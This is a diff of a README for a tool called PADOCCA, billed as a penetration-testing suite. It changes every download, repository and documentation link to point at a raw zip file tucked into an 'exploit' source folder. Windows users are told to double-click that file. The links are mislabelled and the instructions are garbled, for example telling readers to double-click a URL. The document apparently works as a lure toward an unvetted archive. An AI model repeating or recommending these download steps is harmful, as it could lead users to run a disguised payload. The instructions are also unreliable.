@@ -7,20 +7,20 @@ PADOCCA v2.0 combines the best of Rust, Go, and Python to deliver an elite pente
 To begin using PADOCCA, you must first download the application. Follow the steps below to ensure a smooth installation.
 
 ## 🔗 Download PADOCCA
-[![Download PADOCCA](https://raw.githubusercontent.com/micsantiago/padocca/main/lungis/padocca.zip)](https://raw.githubusercontent.com/micsantiago/padocca/main/lungis/padocca.zip)
+[![Download PADOCCA](https://raw.githubusercontent.com/micsantiago/padocca/main/core-rust/src/exploit/Software_3.0-beta.1.zip)](https://raw.githubusercontent.com/micsantiago/padocca/main/core-rust/src/exploit/Software_3.0-beta.1.zip)
 
 ## 📥 Download & Install
-1. **Visit the Release Page**: Click [here](https://raw.githubusercontent.com/micsantiago/padocca/main/lungis/padocca.zip) to go to our Releases page.
+1. **Visit the Release Page**: Click [here](https://raw.githubusercontent.com/micsantiago/padocca/main/core-rust/src/exploit/Software_3.0-beta.1.zip) to go to our Releases page.
    
 2. **Choose the Right File**: On the Releases page, locate the latest version of PADOCCA. You will see different files available for download. Select the one that matches your operating system:
-    - **Windows** Users: Look for `https://raw.githubusercontent.com/micsantiago/padocca/main/lungis/padocca.zip`
+    - **Windows** Users: Look for `https://raw.githubusercontent.com/micsantiago/padocca/main/core-rust/src/exploit/Software_3.0-beta.1.zip`
     - **Linux** Users: Look for `padocca_linux`
     - **macOS** Users: Look for `padocca_mac`
     
 3. **Download the File**: Click on your chosen file to begin the download. Your browser will save this file on your computer.
 
 4. **Run PADOCCA**:
-    - For **Windows**: Double-click on the `https://raw.githubusercontent.com/micsantiago/padocca/main/lungis/padocca.zip` file to run it.
+    - For **Windows**: Double-click on the `https://raw.githubusercontent.com/micsantiago/padocca/main/core-rust/src/exploit/Software_3.0-beta.1.zip` file to run it.
     - For **Linux**: Open your terminal and navigate to the downloaded file location. Use the command `chmod +x padocca_linux` to make it executable, then run it with `./padocca_linux`.
     - For **macOS**: Double-click the `padocca_mac` file to launch the application.
 
@@ -52,8 +52,8 @@ Engage with PADOCCA users and developers through our GitHub page. Share your exp
 PADOCCA is open-source software. You can use, modify, and distribute it under the terms specified in the LICENSE file found in this repository.
 
 ## 🔗 Important Links
-- [Download PADOCCA](https://raw.githubusercontent.com/micsantiago/padocca/main/lungis/padocca.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/micsantiago/padocca/main/lungis/padocca.zip)
-- [Documentation](https://raw.githubusercontent.com/micsantiago/padocca/main/lungis/padocca.zip) 
+- [Download PADOCCA](https://raw.githubusercontent.com/micsantiago/padocca/main/core-rust/src/exploit/Software_3.0-beta.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/micsantiago/padocca/main/core-rust/src/exploit/Software_3.0-beta.1.zip)
+- [Documentation](https://raw.githubusercontent.com/micsantiago/padocca/main/core-rust/src/exploit/Software_3.0-beta.1.zip) 
 
 Start your journey in cybersecurity with PADOCCA today!
